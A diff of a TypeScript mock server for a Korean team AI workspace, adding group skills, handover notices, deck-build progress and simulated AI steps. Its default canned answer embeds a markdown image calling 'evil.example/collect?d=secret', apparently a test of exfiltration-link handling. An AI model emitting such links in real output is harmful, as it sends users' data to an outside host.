     this.speechKey = { set: false, hint: null, updatedAt: null }
+    this.speechChosen = true
     this.transcribeChats = []
-    this.speechHost = { cpuCores: 4, localPieceSec: 30, localSecPerSec: null, hostedNewSec: null }
+    this.transcribeProgress = null
+    this.speechHost = { cpuCores: 4, localPieceSec: 30, localSecPerSec: null, hostedNewSec: null, localMissing: [] }
     if (o.teamLocale) this.settings.defaultLocale = o.teamLocale
     this.activeLeaf.clear()
     this.pendingAsk.clear()
@@ -352,7 +551,13 @@ export class MockServer {
     this.revoked.clear()
     this.downloadOnly.clear()
     this.connection = defaultConnection()
+    this.teamAddress = null
     if (!this.setupNeeded) this.seed()
+    // two admins besides the owner and Bob: Dana (signs in) and Eve (a row an admin cannot delete)
+    if (o.withAdmin && !this.setupNeeded) {
+      this.addUser({ id: 'dana', username: 'dana', name: 'Dana', role: 'admin', groupIds: [], localeChoice: this.usersFollowTeam ? null : 'ko' }, 'dana password 1')
+      this.addUser({ id: 'eve', username: 'eve', name: 'Eve', role: 'admin', groupIds: [], localeChoice: this.usersFollowTeam ? null : 'ko' }, 'eve password 1')
+    }
     for (const u of this.users) if (u.username === o.mustChange) u.mustChangePassword = true
   }
 
@@ -567,12 +772,23 @@ export class MockServer {
   skillChange(c: SkillChange) {
     this.skillChanges.unshift(c)
     const dir = c.path.slice(0, c.path.lastIndexOf('/'))
-    this.publish({ type: 'notice', data: { level: 'info', code: 'skill_changed', message: `팀 스킬이 바뀌었어요: ${c.path} (${c.actor?.name ?? ''}${c.byAi ? ', AI가 저장' : ''})`, link: `/files?path=${encodeURIComponent(dir)}&select=${encodeURIComponent(c.path)}&history=${encodeURIComponent(c.path)}` } })
+    // a deleted one is in 파일 › 휴지통 (server/src/skills/changes.ts historyLink)
+    const link = c.change === 'delete' ? '/files?view=trash' : `/files?path=${encodeURIComponent(dir)}&select=${encodeURIComponent(c.path)}&history=${encodeURIComponent(c.path)}`
+    this.publish({ type: 'notice', data: { level: 'info', code: 'skill_changed', message: `팀 스킬이 바뀌었어요: ${c.path} (${c.actor?.name ?? ''}${c.byAi ? ', AI가 저장' : ''})`, link } })
   }
   /** skills folders this person may change: owner / admin everything, others their own or their group's write rules */
   managed(u: User): string[] {
-    if (u.role === 'owner' || u.role === 'admin') return ['skills']
-    return this.skillManagers.filter((g) => (g.subjectType === 'user' && g.subjectId === u.id) || (g.subjectType === 'group' && u.groupIds.includes(g.subjectId))).map((g) => g.path)
+    // a member manages the skills of their groups (docs/DECISIONS.md "Group skills"; the groups Admin › Groups made)
+    const groups = this.groupSkillRoots(u).map((g) => g.root)
+    if (u.role === 'owner' || u.role === 'admin') return ['skills', ...groups]
+    return [...this.skillGrants().filter((g) => (g.subjectType === 'user' && g.subjectId === u.id) || (g.subjectType === 'group' && u.groupIds.includes(g.subjectId))).map((g) => g.path), ...groups]
+  }
+  /** the skills folders of the person's groups that have a folder of their own (made by Admin › Groups, "this group
+   * writes"): like server/src/chat/skills.ts writableGroupSkillRoots, by group name */
+  groupSkillRoots(u: User): { id: string; name: string; root: string }[] {
+    return this.groups.filter((g) => u.groupIds.includes(g.id) || g.memberIds.includes(u.id))
+      .flatMap((g) => { const f = this.folders.find((x) => x.groupId === g.id); return f ? [{ id: g.id, name: g.name, root: `${f.path}/skills` }] : [] })
+      .sort((a, b) => a.name.toLowerCase().localeCompare(b.name.toLowerCase()))
   }
   teamLinkSkillName(path: string): string | null {
     return this.teamLinkSkill(path)?.name ?? null
@@ -588,11 +804,8 @@ export class MockServer {
     if (!l) return { link: null, seats: { used, limit: null } }
     const named = l.skillPath ? this.teamLinkSkill(l.skillPath, viewer) : null
     const skill = l.skillPath ? { path: l.skillPath, name: named?.name ?? null, title: named?.title ?? null } : null
-    // the starter's files a newcomer with the link's groups could read now (here: those that exist)
-    const paths = l.starter ? l.starter.files.filter((f) => this.files.get(f)?.type === 'file') : []
-    const starter = l.starter ? { kind: l.starter.kind, files: paths.length, paths } : null
     return {
-      link: { id: l.id, url: `${new URL(req.url).origin}/join#t=${l.token}`, groupIds: l.groupIds, skill, starter, maxUses: l.maxUses, uses: l.uses, createdBy: l.createdBy, createdAt: l.createdAt, expiresAt: l.expiresAt, state: l.uses >= l.maxUses ? 'used_up' as const : 'active' as const },
+      link: { id: l.id, url: `${new URL(req.url).origin}/join#t=${l.token}`, groupIds: l.groupIds, skill, maxUses: l.maxUses, uses: l.uses, createdBy: l.createdBy, createdAt: l.createdAt, expiresAt: l.expiresAt, state: l.uses >= l.maxUses ? 'used_up' as const : 'active' as const },
       seats: { used, limit: null },
     }
   }
@@ -620,11 +833,16 @@ export class MockServer {
   }
   /** like server/src/chat/skills.ts listSkills: skills/**.md and the caller's own users/<id>/skills/ with a name header,
    * only where the caller can read */
-  skillsFor(u: User): { path: string; name: string; description: string; title?: string; inputs?: SkillInput[]; personal?: true }[] {
+  skillsFor(u: User, shadowed = false): { path: string; name: string; description: string; title?: string; inputs?: SkillInput[]; personal?: true; group?: { id: string; name: string }; shadowedBy?: { tier: 'personal' | 'group'; group?: { id: string; name: string } }; replaces?: 'team' | 'group' }[] {
     const mine = `users/${u.id}/skills/`
-    const out: { path: string; name: string; description: string; title?: string; inputs?: SkillInput[]; personal?: true }[] = []
+    // the skills of the person's groups (docs/DECISIONS.md "Group skills"): groups/<folder>/skills/, the group's folder
+    // row (its path stays when the group is renamed), else groups/<name>
+    const groupRoots = this.groups.filter((g) => u.groupIds.includes(g.id) || g.memberIds.includes(u.id))
+      .map((g) => ({ g, root: `${this.folders.find((f) => f.groupId === g.id)?.path ?? `groups/${g.name}`}/skills/` }))
+    const out: { path: string; name: string; description: string; title?: string; inputs?: SkillInput[]; personal?: true; group?: { id: string; name: string }; shadowedBy?: { tier: 'personal' | 'group'; group?: { id: string; name: string } }; replaces?: 'team' | 'group' }[] = []
     for (const [p, n] of this.files) {
-      if (n.type !== 'file' || !p.endsWith('.md') || !(p.startsWith('skills/') || p.startsWith(mine)) || this.access(p, u) === 'none') continue
+      const inGroup = groupRoots.find((r) => p.startsWith(r.root))
+      if (n.type !== 'file' || !p.endsWith('.md') || !(p.startsWith('skills/') || p.startsWith(mine) || inGroup) || this.access(p, u) === 'none') continue
       const head = /^---\n([\s\S]*?)\n---/.exec(dec.decode(n.data!))?.[1]
       const name = head ? /^name:\s*(.+)$/m.exec(head)?.[1]?.trim() : undefined
       if (!name) continue
@@ -634,9 +852,25 @@ export class MockServer {
       const form = p.endsWith('/SKILL.md') ? /^[ \t]+inputs:[ \t]*\|\n((?:[ \t]{4,}.*\n?)+)/m.exec(head!)?.[1] : undefined
       let inputs: SkillInput[] | undefined
       try { inputs = form ? (JSON.parse(form) as SkillInput[]) : undefined } catch { inputs = undefined }
-      out.push({ path: p, name, description: /^description:\s*(.+)$/m.exec(head!)?.[1]?.trim().replace(/^"(.*)"$/, '$1') ?? '', ...(title ? { title } : {}), ...(inputs?.length ? { inputs } : {}), ...(p.startsWith(mine) ? { personal: true as const } : {}) })
+      out.push({ path: p, name, description: /^description:\s*(.+)$/m.exec(head!)?.[1]?.trim().replace(/^"(.*)"$/, '$1') ?? '', ...(title ? { title } : {}), ...(inputs?.length ? { inputs } : {}), ...(p.startsWith(mine) ? { personal: true as const } : {}), ...(inGroup ? { group: { id: inGroup.g.id, name: inGroup.g.name } } : {}) })
     }
-    return out.sort((a, b) => a.name.localeCompare(b.name) || a.path.localeCompare(b.path))
+    // one name: personal > group > team (server/src/chat/skills.ts scanSkills)
+    const tier = (s: (typeof out)[number]) => (s.personal ? 0 : s.group ? 1 : 2)
+    const best = new Map<string, number>()
+    for (const s of out) best.set(s.name.toLowerCase(), Math.min(best.get(s.name.toLowerCase()) ?? 3, tier(s)))
+    const byName = (a: (typeof out)[number], b: (typeof out)[number]) => a.name.localeCompare(b.name) || a.path.localeCompare(b.path)
+    const key = (s: (typeof out)[number]) => s.name.toLowerCase()
+    const kept = out.filter((s) => tier(s) === best.get(key(s))).sort(byName)
+    // what a better tier replaced: `replaces` on the one that runs ("/" menu hint), the loser itself with ?shadowed=1
+    const lost = out.filter((s) => tier(s) !== best.get(key(s))).sort(byName)
+    const replaces = new Map<string, 'team' | 'group'>()
+    const losers = lost.map((l) => {
+      const winners = kept.filter((w) => key(w) === key(l))
+      for (const w of winners) if (replaces.get(w.path) !== 'team') replaces.set(w.path, tier(l) === 2 ? 'team' : 'group')
+      const w = winners[0]!
+      return { ...l, shadowedBy: w.personal ? { tier: 'personal' as const } : { tier: 'group' as const, group: w.group } }
+    })
+    return [...kept.map((s) => (replaces.has(s.path) ? { ...s, replaces: replaces.get(s.path) } : s)), ...(shadowed ? losers : [])]
   }
   manages(u: User, folder: string) {
     return this.managed(u).some((m) => folder === m || folder.startsWith(m + '/'))
@@ -644,8 +878,19 @@ export class MockServer {
   suggestionFor(s: SkillSuggestion, u: User): SkillSuggestion {
     return { ...s, canReview: this.manages(u, s.targetFolder) }
   }
+  /** like the server (skills/managers.ts listSkillManagers): the write rules for people and groups on skills/ and its
+   * folders, however they were made (the Team skills dialog or Admin › 폴더 권한), by path, kind and id */
+  skillGrants(): SkillManagerGrant[] {
+    const out: SkillManagerGrant[] = []
+    for (const f of this.folders) {
+      if (f.path !== 'skills' && !f.path.startsWith('skills/')) continue
+      for (const r of f.rules) if (r.access === 'write' && (r.subjectType === 'user' || r.subjectType === 'group') && r.subjectId) out.push({ subjectType: r.subjectType, subjectId: r.subjectId, path: f.path })
+    }
+    const key = (g: SkillManagerGrant) => [g.path, g.subjectType, g.subjectId]
+    return out.sort((a, b) => { const x = key(a), y = key(b); for (let i = 0; i < 3; i++) if (x[i] !== y[i]) return x[i]! < y[i]! ? -1 : 1; return 0 })
+  }
   skillManagersResponse() {
-    return { folders: ['skills', 'skills/재무'], items: this.skillManagers }
+    return { folders: ['skills', 'skills/재무'], items: this.skillGrants() }
   }
 
   // ---------------- realtime ----------------
@@ -656,6 +901,52 @@ export class MockServer {
     this.buffer.push({ seq: full.seq, text })
     if (this.buffer.length > 5000) this.buffer.shift()
     for (const ws of this.sockets) ws.send(text)
+  }
+
+  // ---------------- 팀장 넘기기 ----------------
+  handoverStateOf(u: User): HandoverState {
+    const h = this.handover
+    const open = this.invites.find((i) => i.leadFor && i.leadBy === u.id && !i.usedAt && Date.parse(i.expiresAt) > Date.now())
+    return {
+      flag: h.flag,
+      recovery: h.recovery,
+      openLead: open ? { inviteId: open.id, leadFor: open.leadFor!, expiresAt: open.expiresAt } : null,
+      card: this.leadCardFor(u),
+      connections: h.connections.filter((x) => x.owner === u.id).map(({ owner: _o, ...x }) => x),
+    }
+  }
+  /** the card while it holds: I flagged it, I am still the owner, the joiner is active, the flag is offered */
+  leadCardFor(u: User): HandoverState['card'] {
+    const k = this.handover.card
+    const joiner = k && this.users.find((x) => x.id === k.userId && x.status === 'active')
+    if (!this.handover.flag || !k || !joiner || k.by !== u.id || u.role !== 'owner') return null
+    return { inviteId: k.inviteId, leadFor: k.leadFor, user: { id: joiner.id, name: joiner.name, username: joiner.username }, joinedAt: k.joinedAt, dismissed: k.dismissed }
+  }
+  /** one handover notice in someone's Inbox, and the realtime nudge for it */
+  note(userId: string, n: Record<string, unknown>) {
+    this.inbox.unshift({ id: uuidv7(), userId, createdAt: now(), readAt: null, ...n } as MockServer['inbox'][number])
+    this.publish({ type: 'notice', data: { level: 'info', code: 'notifications.changed', message: '' } })
+  }
+  inboxItem(n: MockServer['inbox'][number]): InboxNotification {
+    const viewer = this.users.find((x) => x.id === n.userId)
+    const code = n.kind === 'lead_joined' ? 'owner.lead_joined' : n.kind === 'transferred' ? 'owner.transferred' : 'owner.reauth_locked'
+    const base = { id: n.id, eventType: code, sourceId: n.id, code, createdAt: n.createdAt, readAt: n.readAt, chatId: null, link: null } as const
+    if (n.kind === 'reauth_locked') return { ...base, handover: { kind: 'reauth_locked' } }
+    if (n.kind === 'lead_joined') {
+      const joiner = this.users.find((x) => x.id === n.joinerId)
+      const card = viewer ? this.leadCardFor(viewer) : null
+      return { ...base, handover: { kind: 'lead_joined', leadFor: n.leadFor, user: joiner ? { id: joiner.id, name: joiner.name, username: joiner.username } : null, joinedAt: n.joinedAt, open: card?.inviteId === n.inviteId } }
+    }
+    const from = this.users.find((x) => x.id === n.fromId)
+    const to = this.users.find((x) => x.id === n.toId)
+    return { ...base, handover: {
+      kind: 'transferred', me: n.me,
+      from: from ? { id: from.id, name: from.name } : null, to: to ? { id: to.id, name: to.name } : null,
+      removable: n.me === 'to' && viewer?.role === 'owner' && from?.status === 'active' && from.role === 'admin',
+      setupUnfinished: n.me === 'to' && !this.welcome?.finishedAt,
+      recovery: this.handover.recovery === 'hosted' ? 'hosted' : null,
+      ended: n.ended,
+    } }
   }
 
   // ---------------- helpers ----------------
@@ -680,12 +971,15 @@ export class MockServer {
     return {
       user: { id: u.id, username: u.username, name: u.name, email: u.email, role: u.role, locale: u.localeChoice ?? this.settings.defaultLocale, localeChoice: u.localeChoice, mustChangePassword: u.mustChangePassword, prefs, canChooseEngine: choose },
       groups: this.groups.filter((g) => u.groupIds.includes(g.id)).map((g) => ({ id: g.id, name: g.name })),
-      team: { name: this.settings.teamName, defaultLocale: this.settings.defaultLocale, browserAllowAll: this.settings.browserAllowAll, iconVersion: this.teamIcon?.version ?? null, voiceInput: this.settings.speechProvider === 'local' || (this.settings.speechProvider === 'openrouter' && this.speechKey.set), ...(this.settings.speechProvider === 'openrouter' && this.speechKey.set ? { voiceInputOutside: true as const } : {}), chatTrashRetentionDays: this.settings.chatTrashRetentionDays },
+      team: { name: this.settings.teamName, defaultLocale: this.settings.defaultLocale, browserAllowAll: this.settings.browserAllowAll, iconVersion: this.teamIcon?.version ?? null, voiceInput: (this.speechNow() === 'local' && this.speechHost.localMissing.length === 0) || (this.speechNow() === 'openrouter' && this.speechKey.set), ...(this.speechNow() === 'openrouter' && this.speechKey.set ? { voiceInputOutside: true as const } : {}), chatTrashRetentionDays: this.settings.chatTrashRetentionDays, ...(this.teamAddress ? { address: this.teamAddress } : {}) },
       session: { id: '0192f0a0-0000-7000-8000-000000000000', client: 'web', expiresAt: new Date(Date.now() + 30 * 86400_000).toISOString(), tempLogin: u.mustChangePassword && this.tempLogins.has(u.id) },
       server: {
         version: this.serverVersion, dev: !this.cloud, deployment: this.cloud ? 'hosted' : 'self', timeZone: this.settings.timeZone,
         ...(this.allConfidential ? { allChatsConfidential: true as const } : {}),
         ...(this.devEnv ? { devEnv: true as const } : {}),
+        ...(this.htmlPdf ? { htmlPdf: true as const } : {}),
+        // the HWP preview, as hwpPreview below answers it: on unless the HWP Preview plugin is installed and turned off
+        ...(this.plugins.installed.some((p) => p.id === 'app.trina.hwp-preview' && !p.enabled) ? {} : { hwpPreview: true as const }),
         features: this.cloud
           ? { connectionChange: false, selfUpdate: false, officeUpdate: false, connectedFolders: false, apiEngineAnyUrl: false, hostDiagnostics: false, pluginFileInstall: false }
           : { connectionChange: true, selfUpdate: true, officeUpdate: false, connectedFolders: true, apiEngineAnyUrl: true, hostDiagnostics: true, pluginFileInstall: true },
@@ -699,29 +993,6 @@ export class MockServer {
     const token = uuidv7()
     this.sessions.set(token, u.id)
     return `${DEV_SESSION_COOKIE}=${token}; Path=/; HttpOnly; SameSite=Lax`
-  }
-
-  devEnvOf(user: User, projectId: string) {
-    if (!this.devEnv || !this.projects.some((p) => p.id === projectId)) fail('not_found', 404)
-    const running = this.devEnv!.box === 'running'
-    const srt = this.devEnv!.srt
-    if (srt) return {
-      availability: { available: true },
-      setting: { enabled: true, scope: { mode: 'writers' as const, groupIds: [], userIds: [] }, network: 'open' as const, limits: { cpus: 1, memoryMiB: 1536, pids: 512, diskGiB: 4, idleStopMin: 30 }, consent: { by: null, at: now(), warningVersion: 2 } },
-      warningVersion: 2, mayUse: true, mayManage: user.role !== 'member', needsFolder: false, box: null, jobs: [], runs: srt, runner: 'srt' as const,
-    }
-    return {
-      availability: { available: true },
-      setting: { enabled: true, scope: { mode: 'writers' as const, groupIds: [], userIds: [] }, network: 'open' as const, limits: { cpus: 1, memoryMiB: 2560, pids: 512, diskGiB: 4, idleStopMin: 30 }, consent: { by: null, at: now(), warningVersion: 1 } },
-      warningVersion: 1,
-      mayUse: true,
-      mayManage: user.role !== 'member',
-      needsFolder: false,
-      box: { state: this.devEnv!.box, startedAt: running ? now() : null, lastActiveAt: now(), memoryMiB: running ? 412 : null, processes: running ? [{ pid: 41, seconds: 120, command: 'npx remotion studio --port 5173' }] : [], stopCode: null },
-      jobs: [],
-      runs: { running: [], waiting: [] },
-      runner: 'box' as const,
-    }
   }
 
   userOf(req: Request): User | null {
@@ -794,7 +1065,7 @@ export class MockServer {
    * holds 4 s; "devqueuefull": it waits too long and ends with the dev environment full; "devqueuejob": a job that
    * waits (#1) after the answer ends. */
   async devQueueTurn(chatId: string, user: User, prompt: string, assistant: Message, pub: (ev: ServerEventInput) => void, step: (s: Partial<Step> & Pick<Step, 'id' | 'kind' | 'label'>) => Step) {
-    this.devEnv ??= { box: 'stopped' }
+    this.devEnv ??= {}
     const srt = (this.devEnv.srt ??= { running: [], waiting: [] })
     const id = `dq-${assistant.id.slice(-8)}`
     const by = { id: user.id, name: user.name }
@@ -852,6 +1123,28 @@ export class MockServer {
       assistant.steps = [...assistant.steps, s2]
       pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s2 } })
     }
+    if (/wrong-guess/i.test(prompt)) {
+      // the AI guesses a file name that does not exist, then finds the right file: a failed step it got past
+      // (docs/DECISIONS.md "A failed step the AI got past is not red")
+      const put = (x: Step) => { assistant.steps = [...assistant.steps.filter((y) => y.id !== x.id), x]; pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: x } }) }
+      const guess = step({ id: 'g1', kind: 'tool', tool: 'read', label: '파일 읽기 · shared/company/acme-profile.md' })
+      put(guess)
+      await sleep(slow ? 600 : 60)
+      put({ ...guess, status: 'error', endedAt: now() })
+      const found = step({ id: 'g2', kind: 'tool', tool: 'glob', label: '파일 찾기 "*profile*" · shared/company/' })
+      put(found)
+      await sleep(slow ? 600 : 60)
+      put({ ...found, status: 'ok', endedAt: now() })
+      put(step({ id: 'g3', kind: 'tool', tool: 'read', label: '파일 읽기 · shared/company/acme-company-profile.md', status: 'ok', endedAt: now() }))
+    }
+    if (/save-fails/i.test(prompt)) {
+      // the last thing the AI does, a save, fails and nothing after it works: a failure nobody got past (red)
+      const put = (x: Step) => { assistant.steps = [...assistant.steps.filter((y) => y.id !== x.id), x]; pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: x } }) }
+      const save = step({ id: 'f1', kind: 'tool', tool: 'write', label: '파일 저장 · shared/company/summary.md' })
+      put(save)
+      await sleep(60)
+      put({ ...save, status: 'error', endedAt: now() })
+    }
     if (/devqueue/i.test(prompt)) await this.devQueueTurn(chatId, user, prompt, assistant, pub, step)
     if (/sub-agent/i.test(prompt)) {
       // a sub-agent (Claude Code's Agent tool): its sub-task step, then its own steps under it (Step.parentId)
@@ -866,7 +1159,7 @@ export class MockServer {
       put(step({ id: 'c2', kind: 'tool', tool: 'grep', label: '내용 검색 "수수료" · shared/', parentId: 'A1', status: 'ok', endedAt: now() }))
       put({ ...a1, status: 'ok', endedAt: now(), subtask: { toolUses: 2, ms: 80_400, hidden: 3 } })
     }
-    // ("/meeting-tasks …", the general skill, has "ask" in its name and is no ask)
+    // ("/meeting-tasks …", a skill with "ask" in its name, is no ask)
     if (/ask/i.test(prompt) && !/^\/meeting-tasks\b/.test(prompt)) {
       const requestId = 'q1'
       // "siteask": like server/src/tools/url-gate.ts with a site to allow (open once / allow the site / don't open) for a
@@ -894,9 +1187,16 @@ export class MockServer {
           : { kind: 'ask_user', requestId, question: '어느 분기를 볼까요?', options: [{ label: '3분기', value: 'q3' }, { label: '4분기', value: 'q4' }], allowText: true }
       this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
       pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
+      // like the server: the chat list says the AI waits for the person (Chat.waiting) while the card is open
+      const waits = this.chats.find((c) => c.id === chatId)!
+      waits.waiting = true
+      // a card that opens is worth telling (chat.updated notify 'card', docs/DECISIONS.md "Session markers")
+      pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat: waits, notify: 'card' } })
       const answer = await new Promise((r) => this.pendingAsk.set(turnId, r))
       this.openAsks.delete(turnId)
       pub({ type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } })
+      delete waits.waiting
+      pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat: waits } })
       if (request.kind === 'dev_env_site' && answer === 'always') {
         const mine = this.devEnvSites.get(user.id) ?? { sites: [], full: false }
         if (!mine.sites.some((x) => x.host === request.host)) mine.sites.push({ host: request.host, createdAt: now() })
@@ -1005,13 +1305,65 @@ export class MockServer {
       pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key: a.key, type: a.type, title: a.title, status: 'done', artifact: { ...summary, size: content.length } } })
     }
     if (/^\/intro-deck\b/.test(prompt)) {
-      // like the team server (server/src/intro-deck/): the intro deck arrives saved, with no "writing" previews
-      const content = '<!DOCTYPE html><html lang="ko"><body><section class="slide" aria-roledescription="slide"><h1>조용한 책상 선풍기</h1></section></body></html>'
-      const version = this.artifacts.filter((a) => a.chatId === chatId && a.key === DECK_ARTIFACT_KEY).length + 1
-      const a: Artifact = { id: uuidv7(), chatId, messageId: assistant.id, key: DECK_ARTIFACT_KEY, version, type: 'html', title: 'Acme 회사 소개서', language: null, content, createdAt: now() }
-      this.artifacts.push(a)
-      const { content: _c, ...summary } = a
-      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key: a.key, type: a.type, title: a.title, status: 'done', artifact: { ...summary, size: content.length } } })
+      // like the team server (server/src/intro-deck/, round 2): an outline, one slide per intro_deck call, the review,
+      // then the deck arrives saved (no "writing" previews); deck.progress after each step
+      const pace = this.deckPaceMs
+      const plan: [DeckBuild['slides'][number]['kind'], string, DeckBuild['slides'][number]['figure'], boolean][] = [
+        ['cover', '표지', null, true], ['about', '회사 소개', 'hub', false], ['needs', '고객의 고민', 'merge', false], ['offer', '하는 일', 'layers', false],
+        ['numbers', '숫자', 'donut', false], ['products', '제품', 'grid', false], ['process', '일하는 방식', 'flow', false], ['proof', '고객의 말', null, false],
+        ['contact', '마무리', null, false],
+      ]
+      let build: DeckBuild = {
+        id: uuidv7(), chatId, messageId: assistant.id, title: 'Acme 회사 소개서', phase: 'slides', current: null, tier: this.deckTier,
+        slides: plan.map(([kind, section, figure, picture]) => ({ kind, section, figure, picture, status: 'planned' as const, rev: 0 })),
+        startedAt: assistant.createdAt, outlineAt: null, slidesAt: null, finishedAt: null, artifactId: null, thumbs: this.deckThumbs,
+      }
+      const progress = (b: DeckBuild) => {
+        build = b
+        this.deckBuilds = [...this.deckBuilds.filter((x) => x.id !== b.id), b]
+        pub({ type: 'deck.progress', data: { chatId, build: b } })
+      }
+      const call = async (id: string, ok = true) => {
+        const st = step({ id, kind: 'tool', tool: 'intro_deck', label: '회사 소개서 만들기 · Acme 회사 소개서' })
+        assistant.steps = [...assistant.steps, st]
+        pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: st } })
+        await sleep(pace)
+        const end = { ...st, status: ok ? 'ok' as const : 'error' as const, endedAt: now() }
+        assistant.steps = assistant.steps.map((x) => (x.id === id ? end : x))
+        pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: end } })
+      }
+      await sleep(pace)
+      // the longer budgets read the company's site and a few articles first, with the build already there
+      if (this.deckTier !== 'quick') {
+        for (const read of [{ pages: 4, articles: 0 }, { pages: 9, articles: 0 }, { pages: 9, articles: 3 }]) {
+          progress({ ...build, phase: 'reading', read, slides: [] })
+          await sleep(pace)
+        }
+      }
+      await call('d-outline')
+      progress({ ...build, phase: 'slides', slides: plan.map(([kind, section, figure, picture]) => ({ kind, section, figure, picture, status: 'planned' as const, rev: 0 })), outlineAt: now(), current: 0 })
+      const failAt = /deck-fail/i.test(prompt) ? 3 : -1
+      for (let i = 0; i < build.slides.length && i !== failAt; i++) {
+        progress({ ...build, current: i, slides: build.slides.map((x, j) => (j === i ? { ...x, status: 'working' as const } : x)) })
+        // the third slide's first try is refused and made again: a normal step in the block, no red mark
+        if (i === 2) await call(`d-slide-${i}-a`, false)
+        await call(`d-slide-${i}`)
+        progress({ ...build, slides: build.slides.map((x, j) => (j === i ? { ...x, status: 'done' as const, rev: x.rev + 1 } : x)) })
+      }
+      if (failAt >= 0) {
+        progress({ ...build, phase: 'failed', current: null, finishedAt: now() })
+      } else {
+        progress({ ...build, phase: 'review', current: null, slidesAt: now() })
+        await sleep(pace)
+        await call('d-finish')
+        const content = '<!DOCTYPE html><html lang="ko"><body><section class="slide" aria-roledescription="slide"><h1>조용한 책상 선풍기</h1></section></body></html>'
+        const version = this.artifacts.filter((a) => a.chatId === chatId && a.key === DECK_ARTIFACT_KEY).length + 1
+        const a: Artifact = { id: uuidv7(), chatId, messageId: assistant.id, key: DECK_ARTIFACT_KEY, version, type: 'html', title: 'Acme 회사 소개서', language: null, content, createdAt: now() }
+        this.artifacts.push(a)
+        const { content: _c, ...summary } = a
+        pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key: a.key, type: a.type, title: a.title, status: 'done', artifact: { ...summary, size: content.length } } })
+        progress({ ...build, phase: 'done', finishedAt: now(), artifactId: a.id })
+      }
     }
     if (/^\/card-news\b/.test(prompt)) {
       // like the team server (server/src/tools/artifact.ts): the card news arrives saved, with no "writing" previews
@@ -1034,14 +1386,20 @@ export class MockServer {
       ? ''
       : capped
         ? 'Sorting the applications into the table.\n\n- Read 20 of 40 so far\n- Scored each one against the job description\n- Saved the first half to the shared sheet\n\nThe rest are still in the folder; this answer stopped before reaching them.'
+      : /long list/i.test(prompt)
+        ? `캠페인 아이디어를 모았어요.\n\n${Array.from({ length: 400 }, (_, i) => `- 아이디어 ${i + 1}: 지역 매장과 함께하는 주말 이벤트, 참가 고객에게 다음 구매 할인 쿠폰`).join('\n')}\n`
+      : /share files/i.test(prompt)
+        ? `견적서를 만들었어요: [acme-quote.md](/files/view?path=${encodeURIComponent(`users/${user.id}/quotes/acme-quote.md`)}). 용어는 [glossary.md](/files/view?path=shared%2Fglossary.md)에, 원가는 [payroll.csv](/files/view?path=secret%2Fpayroll.csv)에 있어요.`
       : /sources/i.test(prompt)
         ? '매출은 [report.pdf · p.4](/files/view?path=docs%2Fsources%2Freport.pdf&page=4)에 있어요. 채널별 금액은 [budget.xlsx · 시트 \'매출\' A40:C44](/files/view?path=docs%2Fsources%2Fbudget.xlsx&sheet=%EB%A7%A4%EC%B6%9C&range=A40:C44)을 보면 돼요.'
+      : /^\/intro-deck\b/.test(prompt)
+        ? (/deck-fail/i.test(prompt) ? '소개서를 끝까지 만들지 못했어요. 다시 해 볼까요?' : '회사 소개서를 만들었어요. 바꾸고 싶은 장이나 문구가 있으면 말씀해 주세요.')
       : prompt.includes('answered:')
         ? `You chose ${prompt.split('answered:')[1]}.`
         : /artifact|react/i.test(prompt)
           ? 'I made an artifact for you.'
           : `Here is **the answer** for: ${prompt.slice(0, 40)}\n\n| name | value |\n|---|---|\n| alpha | 1 |\n| beta | 2 |\n\n\`\`\`python\nprint("hi")\n\`\`\`\n\nMath: $x^2 + 1$ and a price of $5.\n\n![chart](https://evil.example/collect?d=secret)\n\n\`\`\`mermaid\ngraph TD; A-->B\n\`\`\`\n\n[plan](/api/files/download?path=marketing%2Fplan.md)\n`
-    const chunks = text.match(/[\s\S]{1,12}/g) ?? []
+    const chunks = text.match(/long list/i.test(prompt) ? /[\s\S]{1,4000}/g : /[\s\S]{1,12}/g) ?? []
     for (const piece of chunks) {
       if (this.stopped.has(turnId)) break
       const offset = assistant.content.length
@@ -1083,7 +1441,17 @@ export class MockServer {
       this.sources.set(assistant.id, list)
       assistant.sourceCount = list.length
     }
-    if (/files/i.test(prompt)) {
+    if (/mine-source/i.test(prompt)) {
+      // a read of a note in my own folder (the share of a whole chat asks about it: server/src/chat/share-chat.ts)
+      this.putFile(`users/${user.id}/notes/plan.md`, '# My plan\n')
+      this.sources.set(assistant.id, [{ path: `users/${user.id}/notes/plan.md`, name: 'plan.md', locs: [], via: ['read'] }])
+      assistant.sourceCount = 1
+    }
+    if (/share files/i.test(prompt)) {
+      this.putFile(`users/${user.id}/quotes/acme-quote.md`, '# Acme 견적서\n단가 12,000원\n')
+      this.putFile('shared/glossary.md', '# Glossary\n')
+    }
+    if (/files/i.test(prompt) && !/share files/i.test(prompt)) {
       this.putFile('marketing/report.md', '# Report\n')
       assistant.files = { saved: [{ path: 'marketing/report.md', action: 'create' }], conflicts: [{ path: 'marketing/plan.md', copyPath: 'marketing/plan (충돌 사본 - AI).md' }], rejected: [{ path: 'finance/2026/q3.csv', reason: 'read only' }] }
       pub({ type: 'files.changed', data: { changes: [{ path: 'marketing/report.md', action: 'create', by: null, turnId }] } })
@@ -1094,10 +1462,17 @@ export class MockServer {
     const chat = this.chats.find((c) => c.id === chatId)!
     chat.runState = 'idle'
     chat.updatedAt = now()
+    // like the server (migration 252): an answer that finished is unseen until the person has the chat on screen; how it
+    // ended when not well (Chat.lastOutcome: failed, or paused at a limit)
+    chat.unseen = true
+    if (assistant.status === 'error') chat.lastOutcome = 'error'
+    else if (assistant.status === 'done' && assistant.stopReason) chat.lastOutcome = 'paused'
+    else delete chat.lastOutcome
     if (!chat.title) chat.title = prompt.slice(0, 30)
     this.queueRevision++
     pub({ type: 'message.done', data: { chatId, messageId: assistant.id, status: assistant.status, message: this.view(assistant) } })
-    pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat } })
